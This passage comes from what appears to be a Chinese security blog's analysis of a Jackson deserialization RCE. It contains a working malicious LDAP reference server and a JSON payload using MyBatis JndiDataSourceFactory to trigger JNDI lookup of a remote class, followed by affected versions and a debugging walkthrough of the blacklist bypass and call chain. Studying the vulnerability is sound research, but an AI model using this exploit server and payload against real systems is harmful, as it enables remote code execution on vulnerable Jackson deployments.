class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JackonServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8081/#CalcCmd&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>客户端代码编写，需要开启 DefaultTyping；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> entity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonStr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;blckder02\&quot;,\&quot;age\&quot;:21,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;object\&quot;:[&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://127.0.0.1:1389/CalcCmd\&quot;&#125;&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        <span class="type">User</span> <span class="variable">obj</span> <span class="operator">=</span> objectMapper.readValue(jsonStr,User.class);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行成功：<br><img src="/./images/1662088511362.png" alt="enter description here"></p>
+<p><strong>影响版本</strong><br>2.8.11和2.9.x至2.9.3</p>
+<h3 id="POC-调试-2"><a href="#POC-调试-2" class="headerlink" title="POC 调试"></a>POC 调试</h3><p>能成功绕过黑名单检测；<br><img src="/./images/1662088749271.png" alt="enter description here"></p>
+<p>递归获取到<code>properties</code>参数；<br><img src="/./images/1662088805223.png" alt="enter description here"></p>
+<p>跟进到<code>MapDeserializer.deserialize()</code>，获取到<code>properties</code>参数类型是 Properties ；<br><img src="/./images/1662089228430.png" alt="enter description here"></p>
+<p>调用<code>_readAndBindStringMap()</code>进行参数绑定，获取到参数名<code>data_source</code>；<br>调用<code>StringDeserializer.deserialize()</code>获取参数值，最后将参数值赋给<code>data_source</code>；<br><img src="/./images/1662089552828.png" alt="enter description here"></p>
+<p>回到<code>deserializeAndSet()</code>，调用<code>properties</code>的 set 方法；<br><img src="/./images/1662089963257.png" alt="enter description here"></p>
+<p>最后调用<code>lookup()</code>触发命令执行。<br><img src="/./images/1662090004485.png" alt="enter description here"></p>
+<p>调用链如下：<br><img src="/./images/1662090049237.png" alt="enter description here"></p>
+<p>参考链接：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/79257709">https://blog.csdn.net/u011721501/article/details/79257709</a></p>
+
+      </div>
+    </div>
+</div>
+
+<div class="post-category">
+
+    <div id="p-meta-i">
+        
+          
+              
+                <a class="hover-with-bg" href="/tags/%E6%96%B0%E5%BB%BA-%E6%A8%A1%E6%9D%BF-%E5%B0%8F%E4%B9%A6%E5%8C%A0/"># 新建,模板,小书匠</a>
+              
+          
+    </div>
+</div>
+
+
+<div class="post-footer">
+  
+  <div class="donate text-center">
+    <span>喜欢这篇文章？为什么不考虑打赏一下作者呢？</span>
+    <div class="donate-way">
+      
+    </div>
+  </div>
+  
+
+  <div class="post-copyright">
+    <p style="margin: 5px 0;">文章作者：<a href="/">John Doe</a></p>
+    <p style="margin: 5px 0;">文章链接：<a href="http://example.com/2022/09/18/Jackson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20RCE/">http://example.com/2022/09/18/Jackson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20RCE/</a></p>
+    <p style="margin: 5px 0;">版权声明：本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处，谢谢。</p>
+  </div>
+  
+</div>
+
+    <!-- Comments -->
+    <div class="comments">
+        
+        
+    </div>
+
+</article>
+
+
+        </div>
+        
+<footer class="text-center">
+    
+    
+    
+    
+    
+    <p>&copy;  2020 - 2021&nbsp;&nbsp;Theme Miracle</p>
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme by <a href="https://github.com/hifun-team/hexo-theme-miracle" target="_blank">Miracle</a></p>
+    
+    
+</footer>
+
+<div class="p-btn">
+    
+        <a class="toc-btn" id="toc-btn"><i id="i-menu"></i></a>
+    
+    <a href="#top" class="click-btn">
+      <i id="i-up"></i>
+    </a>
+</div>
+
+<!-- SCRIPTS -->
+
+
+
+
+
+
+
+<script>
+    document.getElementById("btn-dropdown").addEventListener('click', () => {
+      toggleClass("#dropdown-menus","display-inline");
+    });
+    console.log('\n' + ' %c Powered by Hexo Theme Miracle ' + ' %c https://github.com/hifun-team/hexo-theme-miracle ' + '\n' + '\n', 'color: #fff; background: #4F9BFA; padding:5px 0;', 'background: #FFF; padding:5px 0;');
+
+    
+
+    
+      document.addEventListener('copy', function (event) {
+      const clipboardData = event.clipboardData || window.clipboardData;
+      if (!clipboardData) { return; }
+      const text = window.getSelection().toString();
+      if (text) {
+        event.preventDefault();
+        clipboardData.setData('text/plain', text + '本文章由 blckder02 撰写，转载请注明来源喔。');
+      }
+    });
+    
+  /* 小彩蛋: 饮茶先啦 */
+  setTimeout(() => {
+    var time = new Date();
+    if (time.getHours() == 15) {
+      let comment = document.createComment(' 三点几嚟！饮茶先啦！ ');
+      document.body.insertBefore(comment, document.getElementsByTagName('header')[0]);
+    }
+  },1);
+    
+</script>
+
+
+<script>
+    var postImg = document.querySelectorAll("article[class=page] img");
+    for (let imgi = 0; imgi < postImg.length; imgi++) {
+        postImg[imgi].onclick = () => {
+            let zoomImg = document.createElement("div");
+            zoomImg.id = "zoomImg";
+            zoomImg.innerHTML = `<div id="zoom-picture"></div>
+    <div class="poptrox-overlay"
+        style="position: fixed; left: 0px; top: 0px; z-index: 20000; width: 100%; height: 100%; text-align: center; cursor: zoom-out; opacity: 1;">
+        <div style="display:inline-block;height:100%;vertical-align:middle;"></div>
+        <div
+            style="position:absolute;left:0;top:0;width:100%;height:100%;background:#000000;opacity:0;filter:alpha(opacity=0);">
+        </div>
+        <div class="poptrox-popup"
+            style="display: inline-block; vertical-align: middle; position: relative; z-index: 1; cursor: zoom-out; min-width: 10px; min-height: 10px; width: auto; height: auto;">
+            <div class="loader" style="display: none;"></div>
+            <div class="pic" style="text-indent: 0px;"><img
+                    src="${ postImg[imgi].srcset || postImg[imgi].src }" alt="Loading..."
+                    style="vertical-align: bottom; max-width: 85vw; max-height: 85vh;"></div>
+        </div>
+    </div>`;
+            document.body.appendChild(zoomImg);
+                document.querySelector("#zoomImg").onclick = () => {
+                    document.querySelector("#zoomImg").remove();
+                }
+        }
+    }
+    
+</script>
+
+
+
+
+    <script>
+        query("#toc-btn")[0].onclick = () => {
+            if (query(".post-toc")[0].innerHTML) {
+                toggleClass(".post-toc", "display-inline");
+            }
+        }
+
+        if (!query(".post-toc")[0].innerHTML) {
+            addClass("#toc-btn","display-none");
+        }
+    </script>
+
+
+
+
+
+
+
+
+
+        </div>
+        <div id="css-loading">
+            <h3 class="text-center">加载中...</h3>
+        </div>
+        
+    </body>
+</html>
